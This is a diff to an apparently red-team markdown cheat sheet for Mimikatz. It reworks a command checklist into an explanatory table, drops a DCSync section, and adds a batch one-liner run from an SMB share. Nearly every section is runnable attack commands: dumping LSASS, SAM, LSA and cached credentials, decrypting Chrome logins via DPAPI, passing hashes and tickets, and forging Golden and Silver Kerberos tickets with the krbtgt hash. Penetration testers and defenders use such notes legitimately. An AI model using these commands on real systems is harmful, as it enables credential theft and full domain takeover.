@@ -5,21 +5,21 @@ title = "Mimikatz"
 - Ref: https://tools.thehacker.recipes/mimikatz/modules
 - Master Class: https://darkoperator.github.io/mimikatz-missing-manual/
 
-Mimikatz is a post-exploitation tool that can extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket, and build Golden Tickets.
+Mimikatz is a Windows post-exploitation tool that can extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket, and build Golden Tickets
 
 ## TL;DR Credential Dumping Checklist
 
-```bash
-privilege::debug
-token::elevate
-sekurlsa::logonpasswords
-sekurlsa::wdigest
-sekurlsa::ekeys
-lsadump::sam
-lsadump::secrets
-lsadump::cache
-lsadump::lsa /patch
-```
+| Command                    | What it does                                                                                                                                                                                                                                                                        |
+| :------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `privilege::debug`         | Enables `SeDebugPrivilege` so Mimikatz can read LSASS memory. Prerequisite for nearly every `sekurlsa::` / `lsadump::` command below.                                                                                                                                               |
+| `token::elevate`           | Impersonates a SYSTEM token. Required to touch protected hives (SAM, SECURITY) for the `lsadump::` commands.                                                                                                                                                                        |
+| `sekurlsa::logonpasswords` | Pulls plaintext passwords, NTLM hashes, and Kerberos material from LSASS for currently logged-on sessions. The primary "dump everything" command.                                                                                                                                   |
+| `sekurlsa::wdigest`        | Extracts cleartext creds from the WDigest provider. Only populated if `UseLogonCredential` is set -- WDigest is off by default since Win8.1 / Server 2012 R2, so usually empty on modern hosts.                                                                                     |
+| `sekurlsa::ekeys`          | Dumps Kerberos encryption keys (AES256/128, RC4) from LSASS. This is what feeds Rubeus OtH (`asktgt /aes256`).                                                                                                                                                                      |
+| `lsadump::sam`             | Dumps local account NTLM hashes from the SAM hive. Local users only, not domain. Needs SYSTEM.                                                                                                                                                                                      |
+| `lsadump::secrets`         | Dumps LSA secrets from the SECURITY hive -- service account passwords, autologon creds, the cached machine account password. Needs SYSTEM.                                                                                                                                          |
+| `lsadump::cache`           | Dumps cached domain logon creds (MSCACHEv2 / DCC2). Crackable offline only -- you cannot pass-the-hash with these.                                                                                                                                                                  |
+| `lsadump::lsa /patch`      | Patches LSASS in memory to extract hashes. On a DC this yields domain account hashes. `/patch` is fast but modifies LSASS (detectable, can destabilize) -- `/inject` is the alternative, and `/inject /name:krbtgt` is the surgical way to grab the krbtgt hash for Golden Tickets. |
 
 ## Important Notes
 
@@ -38,17 +38,17 @@ lsadump::lsa /patch
 # Launch Mimikatz (via SMB share)
 \\tsclient\share\mimikatz.exe
 
-# Enable debug privilege (required for most operations)
+# Enable debug privilege
 privilege::debug
 
 # Elevate token to SYSTEM
 token::elevate
 
-# Write to console in bae64 (avoid AV flagging)
+# Write to console in bae64
 base64 /out:true
 
-# Write output to a logfile (flagged by AV!)
-log <LOGFILE>.txt 
+# Batch commands
+\\tsclient\share\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 ```
 
 ## Credential Dumping
@@ -57,7 +57,7 @@ log <LOGFILE>.txt
 
 **Dump All Credentials:**
 ```bash
-# VERBOSE: Dumps credentials from all providers (Kerberos, WDigest, MSV, etc.)
+# Dumps credentials from all providers (Kerberos, WDigest, MSV, etc.)
 sekurlsa::logonpasswords
 ```
 
@@ -90,6 +90,14 @@ sekurlsa::tickets /export
 sekurlsa::ekeys
 ```
 
+### Extract AES Keys
+
+Pulls derived Kerberos keys (useful for requesting tickets)
+
+```bash
+sekurlsa::ekeys
+```
+
 ### SAM Database
 
 ```bash
@@ -118,23 +126,6 @@ lsadump::cache
 ```bash
 # Dump specific account (e.g., KRBTGT for Golden Ticket)
 lsadump::lsa /inject /name:krbtgt
-```
-
-## DCSync
-
-Might require `runas`.
-
-```bash
-# Specific user
-lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<USER>
-
-# For KRBTGT
-lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\krbtgt
-
-# All users
-# WARNING: takes a long time... write output to a file!
-log dc_sync.txt
-lsadump::dcsync /domain:<DOMAIN> /all
 ```
 
 ## Pass the Hash (PtH)
@@ -181,27 +172,21 @@ sekurlsa::tickets /export
 **Inject Ticket:**
 ```bash
 # Inject ticket into current session
-kerberos::ptt <TICKET_FILE.kirbi>
+kerberos::ptt <TICKET_FILE_KIRBI>
 misc::cmd
-exit
 ```
 
-## Golden & Silver Ticket Attack
+## Golden/Silver Ticket Attack
 
-A **Golden Ticket** is a forged Kerberos TGT that allows you to impersonate any user in the domain, including domain administrators.
+A **Golden Ticket** is a forged Kerberos TGT that impersonates any user in the domain, including domain administrators
 
-A **Silver Ticket** is a forged Kerberos TGS that allows you to impersonate any user on a single machine.
+A **Silver Ticket** is a forged Kerberos TGS that impersonates any user on a single machine
 
 ### Step 1: Get KRBTGT Hash & SID
 
-**Method A (On DC):**
+**On DC:**
 ```bash
 lsadump::lsa /inject /name:krbtgt
-```
-
-**Method B (Remote DCSync):**
-```bash
-lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
 ```
 
 ### Step 2: Create & Inject Ticket
@@ -212,11 +197,11 @@ lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
 - `/user`: can use any value including non-existent users
 
 ```bash
-# GOLDEN TICKET
+# GOLDEN TICKET (need krbtgt)
 kerberos::golden /ptt /id:500 /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM>
 
-# SILVER TICKET
-kerberos::golden /ptt /id:500 /user:Administrator /domain:<DOMAIN> /sid:<SID> /service:cifs /target:<MACHINE_FQDN> /rc4:<MACHINE_HASH> 
+# SILVER TICKET (specify service)
+kerberos::golden /ptt /id:500 /service:cifs /user:Administrator /domain:<DOMAIN> /sid:<SID> /target:<MACHINE_FQDN> /rc4:<MACHINE_HASH> 
 ```
 
 ### Step 3: Launch Shell
@@ -243,10 +228,10 @@ sekurlsa::credman
 Decrypt data protected by Windows DPAPI, such as browser credentials:
 
 ```bash
-dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+dpapi::chrome /unprotect /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 ```
 
-## Launch Terminal of Other User
+## Launch Terminal as Other User
 
 This works through RDP only... a great way to transition from Administrator to `SYSTEM` after running `token::elevate`
 
